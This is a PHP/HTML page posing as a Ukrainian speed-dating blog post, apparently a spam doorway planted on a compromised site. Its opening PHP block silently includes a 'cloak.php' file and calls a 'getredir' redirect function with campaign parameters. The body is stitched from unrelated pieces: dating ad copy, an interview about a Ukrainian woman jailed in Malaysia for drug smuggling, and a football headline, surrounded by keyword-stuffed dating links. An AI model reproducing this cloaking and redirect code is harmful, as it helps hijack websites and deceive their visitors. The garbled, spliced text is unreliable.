<?php
if(!@include('cloak.php'))	@include('../cloak.php');
if(function_exists('getredir')){
	@getredir ('api', '%d1%85%d0%b2%d0%b8%d0%bb%d0%b8%d0%bd%d0%bd%d1%96+%d0%bf%d0%be%d0%b1%d0%b0%d1%87%d0%b5%d0%bd%d0%bd%d1%8f+%d0%96%d0%be%d0%b2%d1%82%d1%96+%d0%92%d0%be%d0%b4%d0%b8+%d0%a3%d0%ba%d1%80%d0%b0%d1%97%d0%bd%d0%b0', '2021-05-21', 'pir_210521/UA_dat_geo_trans_ukr', 'ua_dating.txt');
}
?><!doctype html>
<html lang="">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
	<title>Реєстр програми Аудіовізуальне мистецтво</title>
	<meta name="description" content="Speed dating Швидкі побачення, Львов. Отметки "Нравится": 1 · Обсуждают: 5. Найкрутіші швидкі побачення Львів. Завжди багато учаснтків." />
	<link rel="canonical" href="https://masage.od.ua/img/184/rupyt-hvilinn-pobachennya-zhovt.php" />
<?php if(!@include('../inc1mywp1.php')) @include('inc1mywp1.php'); ?>
						<div id="primary-menu" class="menu"><ul>
<li class="page_item page-item-2"><a href="https://masage.od.ua/img/196/hodi-cholovki-znayomstva-v.php">чоловіки знайомства в Чорноморськ Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/113/wot-znayomstva-studentv-krolevets.php">знайомства студентів Кролевець Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/467/ce-hvilinn-pobachennya-v.php">хвилинні побачення в Болград Україна</a></li><li class="page_item page-item-2"><a href="https://masage.od.ua/img/327/cac-znayomstva-z-hristiyaninom.php">знайомства з християнином Першотравенськ Україна</a></li>
</ul></div>
						<div class="main-navigation-bg"></div>
						<div class="clearfix"></div>
					</nav><!-- #site-navigation -->
				</div>
			</div>

		</div>

	</header><!-- #masthead -->



	<div id="content" class="site-content">
	<div class="container"><div class="row"><div class="col-md-7 order-md-3">
	<div id="primary" class="content-area">
		<main id="main" class="site-main main-content-middle">


<article id="post-1" class="post-1 post type-post status-publish format-standard hentry category-uncategorized">
		<header class="entry-header">
		<h1 class="entry-title">Хвилинні побачення Жовті Води Україна</h1><!-- .entry-meta -->
			</header><!-- .entry-header -->



	<div class="entry-content">

<p>
<p>Софіївська 14, метро Майдан незалежності. Від 10 знайомств за вечір Взяти участь. Як проходять швидкі побачення? У вартість входить:. Вартість участі грн. Заповнити анкету. Про нас говорять. Організаторам спасибо!!! Ще на вечорі speed dating мені відразу сподобалися три дівчини. На наступний день отримав смс з результатами. Хоча на той момент, я навіть не була засуджена, а тільки підозрювана. Дві з половиною тисячі доларів.</p>
<p>Тоді курс був 30 і це величезні гроші. Я була вагітна, не мала грошей і погодилась. Цю роботу мені запропонував мій друг, насправді. Так, друг. Він сказав, що це мала бути робота для нього, але він був дуже зайнятий, не мав часу їздити, тому запропонував мені.</p><strong><a id='q1'></a><h2>SpeedDating, быстрые свидания и экспресс-знакомства в Киеве</h2></strong><p>Спочатку він запропонував перевезти наркотики. Я знала, що в деяких країнах з цим все дуже строго, в Індонезії за грамів розстріляти можуть, тому я сказала — ти чого, зовсім здурів? На той момент я не знала, куди саме треба буде їхати. Але він сказав: роботи є багато, є різна, і запропонував перевезти діаманти. Я подумала до вечора і наступного дня погодилась. Я не хочу виставляти себе жертвою, не хочу, щоб мене жаліли.</p>
<p>Але на той момент мені це здавалось виходом з ситуації — мені було 22 роки, я була вагітна і зовсім без грошей. Адвокати радили тобі не віддавати дитину, адже це суттєва пом' якшуюча обставина? Це був дуже тяжкий вибір.</p><strong><a id='q2'></a><h2>«Динамо» безсиле перед «Шахтарем»</h2></strong><p>Розумієш, я мала вибрати або себе, або дитину. Але в тюрмі зовсім нема умов для новонародженої — навіть гарячої води нема. Як би мені не було тяжко, але я вирішила, що їй буде краще в Україні. Коли моя мама приїхала забрати дочку, це було дуже тяжко. Нам дали побачитись 30 хвилин: 5 хвилин ми молилися, 20 хвилин розмовляли і намагались не плакати. Після вироку Вищого суду подали апеляцію. Тут процедура така, що контракт з адвокатом закінчується у момент вироку, далі потрібно готувати новий контракт. Але адвокати почали готувати апеляцію ще до підписання нового контракту.</p>
<p>Кожен суд займає десь рік, але навіть, якщо суд мене випустить — мене знову заарештує імміграційна служба, як це вже було. Мене вже раз суд відпускав, але тоді мене арештувала імміграційна служба, бо у мене не було візи. Імміграційна служба має право арештувати на 14 днів і за цей час прокурор відкрив нову справу. Мені тут не дуже виходить сподіватись на справедливе розслідування. Під час затримання порушили всі процедури, але на це ніхто не зважає. Я не розуміла, що підписую, але на це теж закрили очі. Я знаю, що питання моєї передачі піднімалось на найвищому рівні — під час візиту українського президента до Малайзії.</p>
<p>Але прем'єр Малайзії тоді сказав, що для них це дуже принципова справа і що мені доведеться пройти через всі кола пекла — суд, Верховний суд, апеляція, Федеральний суд і так далі. Я знаю, що українська сторона просила про перевезення мене в Україну, для дачі показань по цій справі. В Україні у справі я проходжу, як свідок, саме завдяки моїм свідченням затримали двох учасників банди. Але я не впевнена, чи малайзійська сторона погодиться на це. Спочатку казали дочекатись рішення суду і тоді піднімуть питання про передачу.</p>
<p>Тоді мене знову арештувала Імміграційна служба. Малайзійці мені весь час щось обіцяють, кажуть чекати, але я вже нікому не вірю. Зараз я тільки я можу сподіватись на українську сторону, що Генпрокуратура активніше буде наполягати на перевезення мене в Україну. Розмова завершується без попередження — просто звучить гудок в трубці, після чого зв'язок перестає працювати. Оскільки листи від рідних мені передати не дозволили, відправляюсь на місцеве поштове відділення.</p>
<p>Листи були звичайними роздруковками з електронки, то ж на пошті мене дуже здивували питанням: «А у вас конверту нема?</p>
		
			<br><ul>
			
				<li>Україна (U) і в другій грі була сильніша за збірну Словаччини;</li>
			
				<li>право знайомств Винники Україна;</li>
			
				<li>тантричні швидкісні знайомства Буча Україна.</li>
			
			</ul>
		
	<p>Виявилось, що пошта конверти не продає, а купити їх можна хіба у звичайних магазинах. Магазину, звісно ж, поруч з відділенням не було. Працівниці пошти таки вирішили мене не ганяти і знайшли вихід з ситуації — і відправили листи бандероллю. Далі я повертаюсь в Куала Лумпур, де відправляюсь до українського посольства в Малайзії. Наша дипломатична місія розташована в центрі ділового кварталу у величезному хмарочосі, який є резиденцією посольство багатьох країн світу. Олександр Нечитайло, надзвичайний і повноважний посол України в Малайзії погодився відповісти на питання, які стоються Клавдії Лопаткіної та інших українців, ув'язнених у цій країні за контрабанду наркотиків.</p>
<p>Наскільки складним є захист українців, які потрапили у малайзійські в'язниці за звинуваченням у контрабанді наркотиків? Стаття 39б за існуючим законодавством Малайзії передбачає тільки один вид покарання — смертна кара. Більше того, у всіх випадках, де йдеться про перевезення наркотичних речовин, діє так звана презумпція вини. Це означає, що в суді не прокурор має доводити вину підсудного, а навпаки — сторона захисту має переконати суддів, що звинувачена у вчиненні цього злочину особа невинна.</p>
		
	<p>Коли при обшуку у особистих речах чи багажі людини знаходять наркотики, апріорі вважається, що вона знала про їх існування. Тому для адвокатів захисту такі справи є особливо складними. У випадку Клавдії Лопаткіної, адвокат спрацював дуже професійно, бо під час розгляду у суді першої інстанції — Вищому суді Пенангу, вона отримала виправдальний вирок на підставі процесуальних нестиковок.</p>
<p>Оскільки протоколи та свідчення поліції та митників були неправильно оформлені, справу навіть не розглядали по суті. Тобто були різні покази, нестиковки у свідченнях, на підставі чого суд відхилив звинувачення і виніс виправдальний вирок. Але коли Апеляційний суд повернув справу, суддя першої інстанції у своєму висновку відзначив, що вдруге ці аргументи не можуть бути застосовані, і справа розглядалась власне по суті.</p>
<p>На якій стадії зараз перебуває розгляд справи?</p><a id='q3'></a><h3>Чому ми вибрали Speed ​​Dating SVAHA UA</h3><p>Зараз захист подаватиме апеляцію на рішення Вищого суду? Щоб ви розуміли, High court в Малайзії, це не наше розуміння Верховного суду. Це суд першої інстанції. Взагалі в судовій системі Малайзії діють суди трьох інстанцій: High court, це суд першої інстанції, якщо він виносить вирок, можна подавати апеляцію в Апеляційний суд — суд другої інстанції.</p>
<p>І потім, якщо якась з сторін незадоволена рішенням Апеляційного суду, можна звертатися в Федеральний суд, який є аналогом нашого Верховного суду. Тобто це суд, який має юрисдикцію над судами штатів, і він, по суті, є судом найвищої інстанції. Я зустрічався з адвокатами відразу після винесення вироку, ми обговорювали подальшу стратегію захисту. Апеляція вже подана. Як правило, до року. Суди переповнені, і особливо справи, що стосуються перевезення наркотиків, тягнуться навіть не місяцями, а роками. Що стосується наших громадян їх зараз троє, звинувачених у перевезенні наркотиків то такі справи розглядаються практично без затримок, у чому є й певні наші зусилля.</p>
		
			<br><ol>
			
				<li>мусульманські події знайомств поблизу Білопілля Україна.</li>
			
				<li>Історія 25-річної українки Клавдії Лопаткіної.</li>
			
				<li>Кокаїн, діаманти та малайзійська тюрма.</li>
			
			</ul>
		
	<p>У посольства хороший контакт з Департаментом в'язниць. Будь-які побажання наших громадян, якщо вони не враховані безпосередньо адміністрацією пенітенціарного закладу, ми комунікуємо на нашому рівні. Наразі усі запити щодо лікарів, якихось режимних побажань оперативно вирішуються. У випадку з Клавою, були періоди, коли вона гостро потребувала психологічної допомоги і їй практично відразу було надано психолога. Під час зустрічі Клавдія також відзначала цей момент, що зараз у в'язниці з нею працює психолог — ред.</p>
<p>Коли перший суд виніс виправдальний вирок, Лопаткіну відразу ж арештувала Імміграційна служба через відсутність візи. Чи є якась можливість зробити їй документи, щоб таке не повторилось? Це така невелика хитрість чи пастка, яку використовує обвинувачення. Усіх іноземців, які отримують виправдальні вироки у справах, де фігурують наркотичні речовини, відразу затримує служба імміграції, формально — за порушення дозволеного терміну перебування в країні.</p>
<p>Так, це стандартна практика.</p>
</p>
	</div><!-- .entry-content -->

</article><!-- #post-1 -->


		</main><!-- #main -->
	</div><!-- #primary -->


	</div><div class="col-md-2 order-md-1">

	<aside id="secondary" class="widget-area">
			</aside><!-- #secondary -->
</div><div class="col-md-3 order-md-10">
	<aside id="secondary" class="widget-area">
		<section id="search-2" class="widget widget_search"><form role="search" method="get" class="search-form" action="https://masage.od.ua/img/494/kov-lesbysk-znayomstva.php">
				<label>
					<span class="screen-reader-text">Search for:</span>
					<input type="search" class="search-field" placeholder="Search &hellip;" value="" name="s" />
				</label>
				<input type="submit" class="search-submit" value="Search" />
			</form></section>		<section id="recent-posts-2" class="widget widget_recent_entries">		<h2 class="widget-title">Recent Posts</h2>		<ul>
											<li><a href="https://masage.od.ua/img/327/qywy-znayomstva-ponad.php">знайомства понад 50 в Вараш Україна</a></li><li><a href="https://masage.od.ua/img/137/piky-azatskiy-sayt-znayomstv.php">азіатський сайт знайомств Білгород-Дністровський Україна</a></li><li><a href="https://masage.od.ua/img/398/so-naykrash-znayomstva.php">найкращі знайомства в Червоноград Україна</a></li><li><a href="https://masage.od.ua/img/457/jyvu-znayomstva-v-koledzh.php">знайомства в коледжі в Бровари Україна</a></li><li><a href="https://masage.od.ua/img/266/mu-bezkoshtovn-veb.php">безкоштовні веб - сайти знайомств у Windows Бучач Україна</a></li><li><a href="https://masage.od.ua/img/467/be-znayomstva-emgrantv-poblizu.php">знайомства емігрантів поблизу Гірник Україна</a></li>
					</ul>
		</section>

			<section id="meta-2" class="widget widget_meta"><h2 class="widget-title">Contents</h2>
				<ol><li><a href='#q1'>SpeedDating, быстрые свидания и экспресс-знакомства в Киеве</a></li>
<li><a href='#q2'>«Динамо» безсиле перед «Шахтарем»</a></li>
<li><a href='#q3'>Чому ми вибрали Speed ​​Dating SVAHA UA</a></li>
</ol>
			</section>

	</aside><!-- #secondary -->
</div></div></div>	</div>
	<footer id="colophon" class="site-footer">

		<div class="covf-footer-copyright">
			<div class="container">
				<div class="row">
					<div class="col">
						<div class="site-info text-center">
							Powered by 	<a href="https://masage.od.ua/img/361/pesi-ponad-50-shvidksnih.php">Covfefe WordPress Theme</a>
						</div>
					</div>
				</div>
			</div>
		</div>
	</footer><!-- #colophon -->
</div><!-- #page -->

<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/jquery.marquee.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-content/themes/covfefe.1.0.2/covfefe/js/scripts.js?ver=20151215'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/comment-reply.min.js?ver=5.0.3'></script>
<script type='text/javascript' src='https://masage.od.ua/img/wp-includes/js/wp-embed.min.js?ver=5.0.3'></script>

</body>
</html>